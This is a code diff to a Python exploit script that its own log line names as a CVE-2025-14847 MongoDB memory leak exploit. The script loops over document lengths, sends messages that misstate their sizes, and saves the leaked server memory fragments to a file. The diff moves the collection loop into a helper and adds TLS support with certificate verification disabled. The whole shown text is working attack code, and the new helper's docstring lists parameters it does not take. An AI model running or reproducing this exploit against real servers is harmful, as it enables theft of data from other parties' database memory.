@@ -20,6 +20,7 @@ import re
 import socket
 import struct
 import zlib
+import ssl
 from functools import partial
 from pathlib import Path
 from typing import List, Set, Callable
@@ -148,13 +149,49 @@ def extract_leaks(response: bytes) -> List[bytes]:
     return leaked_fragments
 
 
+def collect_unique_fragments(
+    conn: socket.socket,
+    min_document_length: int,
+    max_document_length: int,
+) -> Set[bytes]:
+    """Collect unique leaked fragments across a range of document lengths.
+
+    Args:
+        host: Target host.
+        port: Target port.
+        min_document_length: Starting BSON document length to probe.
+        max_document_length: Ending BSON document length (exclusive).
+        timeout: Socket timeout in seconds.
+
+    Returns:
+        Set of unique leaked fragments observed.
+    """
+    unique_fragments: Set[bytes] = set()
+    try:
+        get_chunk: Callable[[int, int], bytes] = partial(retrieve_chunks, conn)
+        for claimed_doc_length in range(min_document_length, max_document_length):
+            declared_uncompressed_size = claimed_doc_length + 500
+            L.debug(f"nb fragments extracted: {len(unique_fragments)}")
+            L.debug(f"retrieving {claimed_doc_length}:{declared_uncompressed_size}")
+            response = get_chunk(claimed_doc_length, declared_uncompressed_size)
+            leaked_fragments = extract_leaks(response)
+            unique_fragments = unique_fragments.union(set(leaked_fragments))
+    except Exception as e:
+        L.error(
+            f"Encountered an error while trying to collect unique fragments from conn {e}"
+        )
+        raise e
+
+    return unique_fragments
+
+
 def exploit(
     host: str,
-    port: str,
+    port: int,
     min_document_length: int,
     max_document_length: int,
     out_path: Path,
-    timeout: int = 3,
+    tls: bool = True,
 ) -> None:
     """Run the MongoDB memory leak exploit across a range of offsets.
 
@@ -164,28 +201,25 @@ def exploit(
         min_document_length: Starting BSON document length to probe.
         max_document_length: Ending BSON document length (exclusive).
         out_path: File path where leaked bytes are written.
-        timeout: Socket timeout in seconds.
+        tls: Set to True for a TLS socket
     """
     L.info("init CVE-2025-14847 MongoDB Memory Leak script")
     L.info(f"target: {host}:{port}")
     L.info(f"scanning offsets {min_document_length}-{max_document_length}")
 
-    unique_fragments: Set[bytes] = set()
-    conn = socket.socket()
-    conn.settimeout(timeout)
-    try:
-        conn.connect((host, port))
-        get_chunk: Callable[[int, int], bytes] = partial(retrieve_chunks, conn)
-        for claimed_doc_length in range(min_document_length, max_document_length):
-            declared_uncompressed_size = claimed_doc_length + 500
-            L.debug(f"nb fragments extracted: {len(unique_fragments)}")
-            L.debug(f"retrieving {claimed_doc_length}:{declared_uncompressed_size}")
-            response = get_chunk(claimed_doc_length, declared_uncompressed_size)
-            leaked_fragments = extract_leaks(response)
-            unique_fragments = unique_fragments.union(set(leaked_fragments))
-    finally:
-        conn.shutdown(socket.SHUT_RDWR)
-        conn.close()
+    with socket.create_connection((host, port)) as conn:
+        if tls:
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            with context.wrap_socket(conn) as sconn:
+                unique_fragments = collect_unique_fragments(
+                    sconn, min_document_length, max_document_length
+                )
+        else:
+            unique_fragments = collect_unique_fragments(
+                conn, min_document_length, max_document_length
+            )
 
     leaked_bytes = b"".join(list(unique_fragments))
     # Save results
@@ -212,6 +246,7 @@ def parse_arguments() -> argparse.Namespace:
         "--output", default=Path("leaked.bin"), help="Output file", type=Path
     )
     parser.add_argument("--verbose", action=argparse.BooleanOptionalAction)
+    parser.add_argument("--tls", action=argparse.BooleanOptionalAction)
     return parser.parse_args()
 
 
@@ -220,11 +255,7 @@ def main() -> None:
     args = parse_arguments()
     setup_logger(args.verbose)
     exploit(
-        args.host,
-        args.port,
-        args.min_offset,
-        args.max_offset,
-        args.output,
+        args.host, args.port, args.min_offset, args.max_offset, args.output, args.tls
     )
 
 
